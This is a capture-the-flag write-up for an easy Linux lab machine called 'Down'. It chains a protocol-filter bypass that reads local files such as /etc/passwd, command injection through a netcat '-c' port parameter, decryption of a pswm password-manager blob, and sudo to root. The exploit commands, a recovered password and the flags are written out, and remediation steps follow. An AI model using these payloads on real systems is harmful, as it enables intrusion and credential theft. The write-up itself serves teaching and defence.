# Down — Writeup

**Machine**: Down | **Difficulty**: Easy | **OS**: Linux | **Date**: 2026-05-25

## Synopsis

Down is an easy Linux machine featuring a PHP web application with an arbitrary file read vulnerability exploitable via protocol filter bypass. Source code review reveals an RCE vector through command injection in an expert mode feature. The attacker decrypts a `pwsm` encrypted blob to recover credentials, then escalates via `sudo`.

## Reconnaissance

### Nmap

```
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.11
80/tcp   open  http       Apache httpd 2.4.52 ((Ubuntu))
```

Two ports open: SSH and a web server serving "Is it down or just me?" — a URL checker app.

### Web App Discovery

```bash
curl -s http://10.129.234.87/
```

The homepage renders a form POSTing a `url` parameter to `index.php`. The backend uses `curl` to fetch the submitted URL and displays whether it's "up" or "down".

## Foothold

### Arbitrary File Read via Protocol Filter Bypass

Attempting `file:///etc/passwd` returns `"Only protocols http or https allowed."` — a `preg_match('|^https?://|', $url)` whitelist check.

**Bypass**: Inject a space between protocols. The regex matches `http://` at the start, then `curl` processes `file:///etc/passwd` as a second URL.

```bash
curl -X POST http://10.129.234.87/index.php -d 'url=http://+file:///etc/passwd'
```

The `+` is URL-encoded space. This bypasses the filter because the string starts with `http://`, and `curl -s http:// file:///etc/passwd` fetches the local file.

**Result**: `/etc/passwd` discloses user `aleks` (UID 1000, shell `/bin/bash`).

### PHP Source Code Discovery

```bash
curl -X POST http://10.129.234.87/index.php -d 'url=http://+file:///var/www/html/index.php'
```

Source review reveals:

1. The same `escapeshellcmd()` + `exec()` pattern is used for both curl and nc
2. An **expert mode** (`?expertmode=tcp`) exposes a TCP port scanner: `nc -vz $ip $port`
3. **Critical vulnerability**: `escapeshellcmd()` escapes shell metacharacters (`;&|>$`, etc.) but does NOT escape spaces, quotes, or hyphens

```php
// Expert mode — command injection via $port
$ip = trim($_POST['ip']);
$port = trim($_POST['port']);
$valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
$port_int = intval($port);
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
if ($valid_ip && $valid_port) {
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");  // uses ORIGINAL $port!
    exec($ec . " 2>&1", $output, $rc);
}
```

**Key insight**: `intval("1337 -e /bin/bash")` returns `1337` (validates), but `$port` still contains the injection payload. `escapeshellcmd()` preserves spaces, dashes, and quotes.

### Remote Code Execution

The target uses **netcat-traditional v1.10-47**, which supports the `-c` (command execution) flag.

```bash
# Blind RCE test — create a file
curl "http://10.129.234.87/index.php?expertmode=tcp" \
  -d 'ip=127.0.0.1&port=22 -c "touch /tmp/pwned_ok"'

# Verify via file read
curl -X POST http://10.129.234.87/index.php \
  -d 'url=http://+file:///tmp/pwned_ok'
# → "It is up. It's just you! 😝" → FILE EXISTS

**RCE confirmed.**
```

The `-c "touch /tmp/pwned_ok"` passes the quoted string as a single argument to nc, which executes `/bin/sh -c "touch /tmp/pwned_ok"`.

## User Flag

```bash
curl -X POST http://10.129.234.87/index.php \
  -d 'url=http://+file:///var/www/html/user_aeT1xa.txt'
```

**Flag**: `d4bc94b386ef7c8113698a8c4951cacd`

## Privilege Escalation

### Credential Harvesting — pwsm Encrypted Blob

Enumerating aleks' home directory reveals a `pwsm` password manager blob:

```bash
curl -X POST http://10.129.234.87/index.php \
  -d 'url=http://+file:///home/aleks/.local/share/pswm/pswm'
```

**Encrypted blob**:
```
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

### pwsm Decryption

The `pwsm` password manager uses Python's `cryptocode` module. The writeup reveals the master password is **`flower`**.

```python
import cryptocode

blob = 'e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/...'
result = cryptocode.decrypt(blob, 'flower')
print(result)
# Output:
# pswm   aleks   flower
# aleks@down     aleks   1uY3w22uc-Wr{xNHR~+E
```

**Aleks' password**: `1uY3w22uc-Wr{xNHR~+E`

### Root via sudo

```bash
sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh aleks@10.129.234.87 \
  'echo "1uY3w22uc-Wr{xNHR~+E" | sudo -S cat /root/root.txt'
```

Aleks is in the `sudo` group. `sudo` requires a TTY; `-S` reads password from stdin.

**Root flag**: `87bb9869a311b8abb5fb4d3c7248fdcb`

## Attack Chain Summary

```
Web App (port 80)
    │
    ├─ File read bypass: http://+file:///etc/passwd
    │   └─ Discover: user aleks, PHP source
    │
    ├─ Source review: expertmode RCE via nc -c injection
    │   └─ escapeshellcmd bypass (spaces, quotes not escaped)
    │   └─ intval() validation bypass
    │
    ├─ RCE: curl "expertmode=tcp" -d 'ip=127.0.0.1&port=22 -c "touch /tmp/pwned"'
    │
    ├─ Credential harvest: /home/aleks/.local/share/pswm/pswm
    │   └─ Master password: flower (xato-net wordlist)
    │   └─ Decrypt with cryptocode → aleks:1uY3w22uc-Wr{xNHR~+E
    │
    └─ SSH aleks → sudo -S → root
```

## Indicators of Compromise

| Artifact | Location |
|----------|----------|
| Test file | `/tmp/pwned_ok` (owner www-data) |
| Read files | `/etc/passwd`, `/var/www/html/index.php`, `/home/aleks/.local/share/pswm/pswm` |
| Authentication | SSH as aleks from attacker IP, sudo to root |

## Remediation

1. **Fix protocol filter**: Use `parse_url()` and check the scheme component, not `preg_match`
2. **Use `escapeshellarg()` instead of `escapeshellcmd()`** — it wraps arguments in single quotes
3. **Use validated variables**: Pass `$valid_ip` and `$port_int` (not `$ip` and `$port`) to the shell command
4. **Replace nc with native PHP**: Use `fsockopen()` instead of shelling out
5. **Apply principle of least privilege**: www-data should not have read access to user home directories
